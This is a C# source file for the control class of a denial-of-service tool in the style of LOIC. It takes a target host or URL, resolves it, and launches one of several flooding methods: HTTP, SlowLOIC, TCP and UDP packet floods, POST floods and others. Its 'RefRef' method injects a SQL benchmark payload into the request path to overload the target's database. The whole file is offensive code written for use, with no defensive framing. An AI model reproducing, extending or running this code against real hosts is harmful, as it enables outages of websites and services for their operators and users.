using System;
using System.Net;
using GAS.Core.AttackInformation;
using GAS.Core.Attacks;

namespace GAS.Core {
    public class Manager {
        #region Attack info
        public int Timeout = 30;
        public int Threads = 10;
        public int Spt = 50;
        public int Port = 80;
        public int Delay;
        public AttackMethod Method;
        public IPAddress Target = Locolhaust;
        public bool WaitForResponse;
        public bool AppendRANDOMChars;
        public bool AppendRANDOMCharsUrl;
        public bool UseGZIP;
        public bool UseGet;
        public string Subsite = "/";
        private string _dnsString = Locolhaust.ToString();
        #endregion
        static readonly IPAddress Locolhaust = IPAddress.Parse( "127.0.0.1" );
        public IAttacker Worker;
        public string Data;
        public int Requested {
            get {
                return Worker.Requested;
            }
        }
        public int Failed {
            get {
                return Worker.Failed;
            }
        }
        public int Downloaded {
            get {
                return Worker.Downloaded;
            }
        }
        public bool LockOn( string host ) {
            host = host.Trim().ToLower();
            if ( IPAddress.TryParse( host, out Target ) ) {
                this._dnsString = Target.ToString();
                return true;
            }
            try {
                if ( !host.StartsWith( "http://" ) && !host.StartsWith( "https://" ) ) host = String.Concat( "http://", host );
                var trg = new Uri( host );
                Target = Dns.GetHostEntry( trg.Host ).AddressList[ 0 ];
                this._dnsString = trg.Host;
                Subsite = trg.PathAndQuery;
                return true;
            }
            catch {
                Target = Locolhaust;
                return false;
            }
        }
        public void Stop() {
            if ( Worker != null )
                Worker.Stop();
        }
        public void Start() {
            Stop();
            switch ( Method ) {
                case AttackMethod.HTTP:
                    Worker = new HTTPFlooder( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads, 0, this.Spt );
                    break;
                case AttackMethod.ReCoil:
                    Worker = new ReCoil( this._dnsString, Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, WaitForResponse, this.Spt, UseGZIP, Threads );
                    break;
                case AttackMethod.SlowLOIC:
                    Worker = new SlowLoic( this._dnsString, Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, this.Spt, AppendRANDOMCharsUrl, UseGet, UseGZIP, Threads );
                    break;
                case AttackMethod.TCP:
                    Worker = new PacketFlood( Target.ToString(), Port, 1, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads, this.Spt );
                    break;
                case AttackMethod.UDP:
                    Worker = new PacketFlood( Target.ToString(), Port, 2, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads, this.Spt );
                    break;
                case AttackMethod.RefRef:
                    this.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))".Replace( " ", "%20" );
                    Worker = new HTTPFlooder( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads, 0, this.Spt );
                    break;
                case AttackMethod.AhrDosme:
                    Worker = new HTTPFlooder( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads, 1, this.Spt );
                    break;
                case AttackMethod.Post:
                    Worker = new PostAttack( this._dnsString, Target.ToString(), Port, Subsite, WaitForResponse, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, UseGZIP, Threads );
                    break;
                case AttackMethod.TMOF:
                    Worker = new TMOF( Target.ToString(), Port, Threads, int.MaxValue );
                    break;
                default:
                    throw new NotImplementedException( "Code it yourself, lazy bastard" );
            }
            Worker.Start();
        }
    }
}
